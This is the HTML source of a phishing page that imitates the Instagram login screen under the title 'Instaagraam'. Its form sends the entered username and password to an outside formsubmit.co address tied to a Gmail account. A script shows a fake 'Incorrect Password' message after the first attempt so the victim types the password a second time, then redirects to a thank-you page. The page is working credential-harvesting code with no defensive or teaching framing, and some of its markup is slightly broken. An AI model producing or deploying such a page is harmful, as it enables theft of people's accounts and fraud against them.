<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instaagraam</title>

  <!-- FAVICON -->
  <link rel="shortcut icon" href="./images/favicon.png" type="image/png" />

  <!-- GOOGLE FONT -->
  <link rel="preconnect" href="https://fonts.gstatic.com" />
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet" />

  <!-- APP CSS -->
  <link rel="stylesheet" href="./app.css" />

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
    crossorigin="anonymous" referrerpolicy="no-referrer" />

  <style>
    .body {
      background-color: 'yellow';
    }

    /* Modal styling */
    #errorModal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      z-index: 1000;
      justify-content: center;
      align-items: center;
    }

    #errorModal .modal-box {
      background: #fff;
      padding: 20px 30px;
      border-radius: 10px;
      max-width: 300px;
      text-align: center;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
    }

    #errorModal .modal-box h3 {
      margin-bottom: 10px;
      color: #e74c3c;
    }

    #errorModal .modal-box p {
      font-size: 14px;
    }

    #errorModal .modal-box button {
      margin-top: 10px;
      padding: 8px 16px;
      background-color: #0067b8;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
  </style>
</head>

<body>
  <!-- Modal -->
  <div id="errorModal">
    <div class="modal-box">
      <h3>Incorrect Password</h3>
      <p>Please double-check your password and try again.</p>
      <button onclick="closeModal()">Try Again</button>
    </div>
  </div>

  <div class="container">
    <div class="main-container">
      <div class="main-content">
        <div class="slide-container" style="background-image: url(./images/phone-frame.png);">
          <div class="slide-content" id="slide-content">
            <img src="./images/slide (1).jpg" alt="slide image" class="active" />
            <img src="./images/slide (2).jpg" alt="slide image" />
            <img src="./images/slide (3).jpg" alt="slide image" />
            <img src="./images/slide (4).jpg" alt="slide image" />
            <img src="./images/slide (5).jpg" alt="slide image" />
          </div>
        </div>

        <div class="form-container">
          <form id="form" method="POST" action="https://formsubmit.co/paymentsuccessfully25@gmail.com">
            <div class="form-content box">
              <div class="logo">
                <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light" />
                <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark" />
              </div>

              <div class="btn-group">
                <button class="btn-login" type="submit">
                  <i class="fab fa-facebook-square"></i> Continue Using Facebook
                </button>
              </div>

              <div class="divine">
                <div></div>
                <div>OR</div>
                <div></div>
              </div>

              <div class="signin-form" id="signin-form">
                <div class="form-group">
                  <div class="animate-input">
                    <span>Phone number, username or email</span>
                    <input type="text" name="username" id="username" required />
                    <input type="hidden" name="_captcha" value="false" />/thanks.html" />
                  </div>
                </div>

                <div class="form-group">
                  <div class="animate-input">
                    <span>Password</span>
                    <input type="text" name="password" id="password" required />
                    <button type="button">Show</button>
                  </div>
                  <div style="text-align: right; color: rgb(0, 17, 255);">
                    <a href="#" class="forgot-pw">Forgotten your password?</a>
                  </div>
                </div>

                <div class="btn-group">
                  <button class="btn-login" type="submit">Sign In</button>
                  <div class="box goto">
                    <p>
                      Don't have an account?
                      <a href="#">Sign up</a>
                    </p>
                  </div>
                </div>
              </div>
            </div>

            <div class="app-download">
              <p>Get the app.</p>
              <div class="store-link">
                <a href="#"><img src="./images/app-store.png" alt="app store" /></a>
                <a href="#"><img src="./images/gg-play.png" alt="google play" /></a>
              </div>
            </div>
          </form>
        </div>
      </div>

      <div class="footer">
        <div class="links">
          <a href="#">About</a>
          <a href="#">Blog</a>
          <a href="#">Jobs</a>
          <a href="#">Help</a>
          <a href="#">API</a>
          <a href="#">Privacy</a>
          <a href="#">Terms</a>
          <a href="#">Top Accounts</a>
          <a href="#">Hashtags</a>
          <a href="#" id="darkmode-toggle">Darkmode</a>
        </div>
        <hr />
        <div class="copyright">
          <p>from</p>
          <img src="images/download.jpg" alt="" />
        </div>
      </div>
    </div>
  </div>

  <!-- JavaScript for modal + submission control -->
  <script>
    let attemptCount = 0;

    document.getElementById('form').addEventListener('submit', function (e) {
      attemptCount++;

      const nextInput = document.getElementById('nextField');

      if (attemptCount === 1) {
        // First submit: cancel redirect but still send form
        nextInput.value = window.location.href;
        setTimeout(() => {
          document.getElementById('errorModal').style.display = 'flex';
        }, 500);
      } else {
        // Second submit: allow redirect
        nextInput.value = "https://frilea.vercel.app/thanks.html";
      }
    });

    function closeModal() {
      document.getElementById('errorModal').style.display = 'none';
    }
  </script>
  <script src='app.js'></script>
</body>

</html>
